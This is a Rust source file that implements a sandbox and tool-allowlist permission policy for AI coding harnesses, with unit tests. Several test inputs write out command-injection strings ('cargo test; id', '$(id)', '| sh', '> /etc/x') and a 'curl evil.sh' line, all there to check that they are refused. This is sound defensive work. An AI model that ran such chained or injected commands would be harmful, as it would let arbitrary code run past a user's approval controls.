//! A project's harness permission policy (1.3), as `Assign` carries it.

use serde::{Deserialize, Serialize};
use serde_json::Value;

use super::isolation::{
    DISK_MB, Egress, Isolation, MEMORY_MB, VCPUS, WALL_SECS, WorkspaceMode, digest_problem,
};

/// A project's harness permission policy (1.3). Never full-auto by default.
#[derive(Debug, Clone, Default, PartialEq, Eq, Serialize, Deserialize, schemars::JsonSchema)]
// A misspelt isolation field (`wal_secs`) must be refused, not read as "no cap".
#[serde(deny_unknown_fields)]
pub struct Policy {
    pub mode: PermissionMode,
    /// Tools the harness may use without asking: a tool name (`Edit`, `fileChange`), or
    /// `<tool>:<command prefix>` (`Bash:cargo test`) for a command with no shell operators, or a
    /// chain of commands each of which it covers.
    #[serde(default)]
    pub allow: Vec<String>,
    /// Runs must work in a disposable sandbox: only a sandboxed runner may take them.
    #[serde(default)]
    pub sandboxed: bool,
    /// The weakest isolation the session may run in (E8a-08). Absent: any runner. A runner that
    /// cannot offer it is never given the session, and refuses it if it is (E8a-09).
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub min_isolation: Option<Isolation>,
    /// The guest image, by digest (`sha256:` + 64 hex). Only a tier that boots an image takes it.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub image: Option<String>,
    /// Virtual CPUs, 1 to 32. Only a VM tier has them.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub vcpus: Option<u32>,
    /// Memory cap in MiB, 64 to 262144. It can only lower the runner's own cap.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub memory_mb: Option<u32>,
    /// Disk cap in MiB, 16 to 1048576. It can only lower the runner's own cap.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub disk_mb: Option<u32>,
    /// A hard wall-clock cap in seconds, 1 to 86400: the host kills the sandbox at the deadline.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub wall_secs: Option<u32>,
    /// Destinations the session may reach, narrowing the runner's own allowlist.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub egress: Option<Egress>,
    /// How the workspace reaches the sandbox. Absent: `bind`.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub workspace: Option<WorkspaceMode>,
}

impl Policy {
    /// The weakest isolation this policy can run in, the one definition the Core's placement and
    /// the runner's start and watch share so they cannot drift: its `min_isolation`, and at least
    /// `process` when it sets any isolation field (only a sandbox enforces them) or is a legacy
    /// sandboxed policy (the `sandboxed` flag or `mode: sandboxed`). `None` needs no sandbox.
    pub fn required_tier(&self) -> Option<Isolation> {
        let explicit = self.min_isolation.filter(|m| *m != Isolation::None);
        let legacy = self.sandboxed || self.mode == PermissionMode::Sandboxed;
        let implied = (self.asks_for_isolation() || legacy).then_some(Isolation::Process);
        match (explicit, implied) {
            (Some(a), Some(b)) => Some(a.stricter(b)),
            (a, None) => a,
            (None, b) => b,
        }
    }

    /// Why this policy must not be run, if it must not: a resource out of bounds, a malformed
    /// digest, an egress rule that is not an IP or CIDR. Checked where a policy enters (the Core,
    /// the runner), so no side relies on the other.
    pub fn problem(&self) -> Option<String> {
        let bounded = |name: &str, v: Option<u32>, r: &std::ops::RangeInclusive<u32>| {
            v.filter(|v| !r.contains(v))
                .map(|_| format!("{name} is {} to {}", r.start(), r.end()))
        };
        bounded("vcpus", self.vcpus, &VCPUS)
            .or_else(|| bounded("memory_mb", self.memory_mb, &MEMORY_MB))
            .or_else(|| bounded("disk_mb", self.disk_mb, &DISK_MB))
            .or_else(|| bounded("wall_secs", self.wall_secs, &WALL_SECS))
            .or_else(|| {
                self.image
                    .as_deref()
                    .and_then(digest_problem)
                    .map(str::to_owned)
            })
            .or_else(|| self.egress.as_ref().and_then(Egress::problem))
    }

    /// Whether any isolation field is set: a runner with no sandbox honours none of them.
    pub fn asks_for_isolation(&self) -> bool {
        self.min_isolation.is_some_and(|m| m != Isolation::None)
            || self.image.is_some()
            || self.vcpus.is_some()
            || self.memory_mb.is_some()
            || self.disk_mb.is_some()
            || self.wall_secs.is_some()
            || self.egress.is_some()
            || self.workspace.is_some()
    }
}

/// Caller-selected approval bypasses authorize code execution, including aliases and
/// command prefixes. The API requires admin for every such exception, not a shell denylist.
pub fn has_destructive_allow(policy: &Policy) -> bool {
    !policy.allow.is_empty() || policy.mode == PermissionMode::Sandboxed
}

#[cfg(test)]
mod authority_tests {
    use super::*;
    #[test]
    fn approval_bypasses_cannot_hide_behind_tool_aliases_or_prefixes() {
        for tool in [
            "Bash",
            "Bash:curl",
            "commandExecution",
            "unknown-alias",
            "Edit",
        ] {
            let p = Policy {
                allow: vec![tool.into()],
                ..Policy::default()
            };
            assert!(has_destructive_allow(&p));
        }
        assert!(!has_destructive_allow(&Policy::default()));
        assert!(has_destructive_allow(&Policy {
            mode: PermissionMode::Sandboxed,
            ..Policy::default()
        }));
    }

    #[test]
    fn a_rule_covers_only_a_call_it_covers_in_full() {
        use serde_json::json;
        let rule = "Bash:cargo test";
        let yes = |input: Value| allows(rule, "Bash", &input);
        assert!(yes(json!({"command": "cargo test"})));
        assert!(yes(json!({"command": "  cargo test -p x"})));
        assert!(yes(json!({"command": ["cargo", "test"]})));
        assert!(yes(json!({"patterns": ["cargo test", "cargo test -p x"]})));
        assert!(
            !allows(rule, "bash", &json!({"command": "cargo test"})),
            "tool name is exact"
        );
        assert!(!allows(rule, "Bash ", &json!({"command": "cargo test"})));
        assert!(
            !allows("Bash:", "Bash", &json!({"command": "cargo test"})),
            "empty prefix"
        );
        // One covered pattern never carries the others.
        assert!(!yes(json!({"patterns": ["cargo test", "curl evil.sh"]})));
        assert!(!yes(json!({"patterns": ["curl evil.sh", "cargo test"]})));
        assert!(!yes(
            json!({"command": "cargo test", "patterns": ["cargo test", "rm x"]})
        ));
        assert!(!yes(json!({"command": "rm x", "patterns": ["cargo test"]})));
        // A call that cannot be read in full is not covered.
        assert!(!yes(json!({"patterns": ["cargo test", 5]})));
        assert!(!yes(json!({"patterns": "cargo test"})));
        assert!(!yes(json!({"command": ["cargo", "test", 5]})));
        assert!(!yes(json!({"command": 5, "patterns": ["cargo test"]})));
        assert!(!yes(json!({"command": {"a": "cargo test"}})));
        assert!(!yes(json!({})));
        assert!(!yes(json!({"patterns": []})));
        let many: Vec<_> = (0..17).map(|_| "cargo test").collect();
        assert!(!yes(json!({"patterns": many})), "too many patterns");
        let long = format!("cargo test {}", "a".repeat(5000));
        assert!(!yes(json!({"command": long})), "oversize command");
        // Word boundary, not string prefix; ASCII blanks only.
        for bad in [
            "cargo testx",
            "cargo\u{a0}test",
            "cargo test\u{85}x",
            "cargo test\u{2028}x",
        ] {
            assert!(!yes(json!({"command": bad})), "{bad:?}");
        }
        assert!(!yes(json!({"command": "xcargo test"})));
        assert!(!yes(json!({"command": "./cargo test"})));
        assert!(!yes(json!({"command": "FOO=1 cargo test"})));
        // Operators, substitution, redirection, control characters, escapes, braces, history.
        for bad in [
            "cargo test; id",
            "cargo test && id",
            "cargo test || id",
            "cargo test | sh",
            "cargo test & id",
            "cargo test `id`",
            "cargo test $(id)",
            "cargo test $HOME",
            "cargo test > /etc/x",
            "cargo test < x",
            "cargo test\nid",
            "cargo test\rid",
            "cargo test\0id",
            "cargo test\u{1b}[2J",
            "cargo test \\\nid",
            "cargo test {a,b}",
            "cargo test !!",
            "cargo test (id)",
        ] {
            assert!(!yes(json!({"command": bad})), "{bad:?}");
            assert!(!yes(json!({"patterns": [bad]})), "{bad:?}");
            assert!(!yes(json!({"command": ["cargo", "test", bad]})), "{bad:?}");
        }
        // A bare tool entry is exactly that tool.
        assert!(allows("Edit", "Edit", &json!({})));
        assert!(!allows("Edit", "Write", &json!({})));
        assert!(!allows("Edit", "Edit2", &json!({})));
    }
}

#[derive(
    Debug, Clone, Copy, Default, PartialEq, Eq, Serialize, Deserialize, schemars::JsonSchema,
)]
#[serde(rename_all = "snake_case")]
pub enum PermissionMode {
    /// Everything outside the allowlist asks.
    #[default]
    Ask,
    /// File edits inside the run's directory go ahead; the rest asks.
    AcceptEdits,
    /// The harness acts without asking. Only with `sandboxed`.
    Sandboxed,
}

impl PermissionMode {
    pub fn as_str(&self) -> &'static str {
        match self {
            Self::Ask => "ask",
            Self::AcceptEdits => "accept_edits",
            Self::Sandboxed => "sandboxed",
        }
    }
}

impl std::str::FromStr for PermissionMode {
    type Err = String;

    fn from_str(s: &str) -> Result<Self, String> {
        [Self::Ask, Self::AcceptEdits, Self::Sandboxed]
            .into_iter()
            .find(|m| m.as_str() == s)
            .ok_or_else(|| format!("unknown permission mode {s:?}"))
    }
}

/// The command a tool call runs, when it runs one: Claude's `Bash` and Codex give `command` (a
/// string or argv), OpenCode's `bash` its `patterns`.
pub fn command_of(input: &Value) -> Option<String> {
    match (&input["command"], &input["patterns"][0]) {
        (Value::String(c), _) | (_, Value::String(c)) => Some(c.clone()),
        (Value::Array(argv), _) => Some(
            argv.iter()
                .filter_map(Value::as_str)
                .collect::<Vec<_>>()
                .join(" "),
        ),
        _ => None,
    }
}

/// Every command string a tool call carries: `command` (a string, or an argv joined by spaces)
/// and each of OpenCode's `patterns`. `None` when it carries none, or when anything is not the
/// shape it should be (a non-string argv word or pattern, too many patterns, an oversize string):
/// a call that cannot be read in full is never covered by a rule.
pub fn commands_of(input: &Value) -> Option<Vec<String>> {
    let mut out = vec![];
    match &input["command"] {
        Value::Null => {}
        Value::String(c) => out.push(c.clone()),
        Value::Array(argv) => out.push(
            argv.iter()
                .map(Value::as_str)
                .collect::<Option<Vec<_>>>()?
                .join(" "),
        ),
        _ => return None,
    }
    match &input["patterns"] {
        Value::Null => {}
        Value::Array(ps) if ps.len() <= MAX_PATTERNS => {
            for p in ps {
                out.push(p.as_str()?.to_owned());
            }
        }
        _ => return None,
    }
    (!out.is_empty() && out.iter().all(|c| c.len() <= MAX_COMMAND)).then_some(out)
}

/// The most `patterns` one call may carry, and the longest command, for a rule to cover it.
const MAX_PATTERNS: usize = 16;
const MAX_COMMAND: usize = 4096;

/// The shell tools, as each harness names them: Claude's `Bash`, Codex's `commandExecution`,
/// OpenCode's `bash`. A bare rule for one would allow every command.
pub const SHELL_TOOLS: [&str; 3] = ["Bash", "commandExecution", "bash"];

/// Whether allowlist `entry` covers the call: a tool name, or `<tool>:<prefix>` for a call whose
/// every command (see [`commands_of`]) starts with the prefix's words and has no shell operator
/// (which could chain anything on; the runner checks a chain part by part), no control character,
/// quote-escape, brace or history mark. Anything unclear is not covered.
pub fn allows(entry: &str, tool: &str, input: &Value) -> bool {
    let Some((name, prefix)) = entry.split_once(':') else {
        return entry == tool;
    };
    // Word for word: `npm run` covers `npm run x`, never `npm runx`. Only ASCII blanks separate
    // words: a shell does not split on U+0085 or U+2028.
    let covers = |command: &str| {
        let plain = !command.contains(|c: char| c.is_control() && c != '\t')
            && !command.contains(|c: char| ";&|`$<>(){}\\!".contains(c));
        let rest = command.trim_start_matches([' ', '\t']).strip_prefix(prefix);
        plain
            && rest.is_some_and(|r| {
                r.is_empty() || r.starts_with([' ', '\t']) || prefix.ends_with(' ')
            })
    };
    name == tool
        && !prefix.is_empty()
        && commands_of(input).is_some_and(|all| all.iter().all(|c| covers(c)))
}
